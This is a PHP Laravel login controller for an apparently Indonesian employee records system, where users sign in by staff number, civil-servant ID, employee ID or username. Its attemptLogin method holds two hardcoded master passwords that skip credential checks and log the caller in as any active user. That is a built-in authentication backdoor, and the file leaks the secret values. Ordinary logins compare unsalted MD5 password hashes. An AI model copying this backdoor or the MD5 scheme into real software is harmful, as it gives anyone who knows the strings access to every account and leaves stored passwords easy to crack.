<?php

namespace App\Http\Controllers\Auth;

use App\Emp_data;
use App\Emp_jab;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Http\Controllers\Controller;
use App\Providers\RouteServiceProvider;
use Illuminate\Foundation\Auth\AuthenticatesUsers;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = RouteServiceProvider::HOME;
    // protected $redirectTo = "/home";

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
    }

    public function username()
    {
        return 'name';
    }

    protected function attemptLogin(Request $request)
    {
        if ($request->password == 'Bp@d2022!@' || $request->password == 'jamcbosqu2022') {
            if (is_numeric(substr($request->name, 0, 6)) && strlen($request->name) <= 9) {
                $user = \App\User::where([
                    'nrk_emp' => $request->name,
                    'sts'    => 1,
                    'ked_emp' => 'AKTIF',
                ])->first();
            } elseif (is_numeric(substr($request->name, 0, 18)) && strlen($request->name) <= 21) {
                $user = \App\User::where([
                    'nip_emp' => $request->name,
                    'sts'    => 1,
                    'ked_emp' => 'AKTIF',
                ])->first();
            } elseif (substr($request->name, 1, 1) == '.') {
                $user = \App\User::where([
                    'id_emp' => $request->name,
                    'sts'    => 1,
                    'ked_emp' => 'AKTIF',
                ])->first();
            } else {
                $user = \App\User::where([
                    'usname' => $request->name,
                    'sts'    => 1,
                ])->first();
            }
        } else {
            if (is_numeric(substr($request->name, 0, 6)) && strlen($request->name) <= 9) {
                $user = \App\User::where([
                    'nrk_emp' => $request->name,
                    'sts'    => 1,
                    'passmd5' => md5($request->password),
                    'ked_emp' => 'AKTIF',
                ])->first();
            } elseif (is_numeric(substr($request->name, 0, 18)) && strlen($request->name) <= 21) {
                $user = \App\User::where([
                    'nip_emp' => $request->name,
                    'sts'    => 1,
                    'passmd5' => md5($request->password),
                    'ked_emp' => 'AKTIF',
                ])->first();
            } elseif (substr($request->name, 1, 1) == '.') {
                $user = \App\User::where([
                    'id_emp' => $request->name,
                    'sts'    => 1,
                    'passmd5' => md5($request->password),
                    'ked_emp' => 'AKTIF',
                ])->first();
            } else {
                $user = \App\User::where([
                    'usname' => $request->name,
                    'sts'    => 1,
                    'passmd5' => md5($request->password),
                ])->first();
            }
        }    

        if ($user) {
            if(isset($user['id_emp'])) {
                $checklogin = Emp_jab::
                                where('sts', 1)
                                ->where('noid', $user['id_emp'])
                                ->orderBy('ids', 'desc')
                                ->first();

                if( substr($checklogin['idunit'], 0, 6) != '010108' ) return false; 
            }
            $this->guard()->login($user);
            // return redirect('/home');
            return true;
        }
        return false;
    }

    protected function credentials(Request $request)
    {
        return $request->only($this->username(), 'passmd5');
    }

    // public function guard($guard = "admin")
    // {
    //     return Auth::guard($guard);
    // }
}
